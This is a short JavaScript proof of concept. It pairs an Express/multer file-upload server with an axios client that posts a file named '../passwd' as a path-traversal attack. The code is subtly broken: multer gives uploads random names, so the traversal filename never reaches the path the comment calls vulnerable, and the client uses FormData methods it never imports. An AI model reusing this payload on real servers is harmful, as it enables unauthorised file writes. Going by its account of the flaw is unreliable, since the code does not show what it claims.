const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const app = express();

// Configure multer to save uploaded files to a directory
const upload = multer({ dest: 'uploads/' });

// Simple file upload endpoint
app.post('/upload', upload.single('file'), (req, res) => {
  console.log('File uploaded:', req.file);

  // Vulnerability: No validation of the file path, attacker can upload to any location
  const filePath = path.join(__dirname, 'uploads', req.file.filename);
  fs.renameSync(req.file.path, filePath);

  res.send('File uploaded successfully');
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});

const axios = require('axios');
// const fs = require('fs');

// Malicious file upload with a path traversal attack
const formData = new FormData();
formData.append('file', fs.createReadStream('malicious_file.txt'), '../passwd');

axios.post('http://localhost:3000/upload', formData, {
  headers: formData.getHeaders()
})
  .then(response => {
    console.log('Response:', response.data);
  })
  .catch(error => {
    console.error('Error:', error.message);
  });
